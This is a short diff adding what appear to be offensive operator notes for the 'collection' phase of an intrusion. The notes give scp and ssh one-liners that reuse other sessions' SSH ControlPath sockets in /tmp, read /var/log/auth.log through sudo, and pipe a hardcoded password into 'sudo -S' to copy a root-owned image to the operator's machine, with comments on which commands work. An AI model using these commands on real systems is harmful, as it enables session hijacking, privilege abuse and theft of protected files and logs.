@@ -1,0 +1,14 @@
+operational objectives
+collection
+scp /path/to/local/file <user>@<remote ip>:~/. upload
+scp <user>@<remote_ip>:[/path/to/remote]<file> [/path/to/local/file] - download (what we be doing)
+
+scp -o ControlPath=/tmp/T1 dummy:<filename> . (works for unpriv files) 
+du -h for file size
+
+ssh -t -S /tmp/T4 dummy "sudo cat /var/log/auth.log" > auth.log (deprecated)
+
+ssh -S /tmp/T6 dummy 'echo password2 | sudo -S cat /root/picz/powerplant.jpeg' > powerplant.jpeg (actually works for priv)
+
+FOR WINDOWS, PUT THE SLASHES THE LINUX WAY FOR SCP ////
+
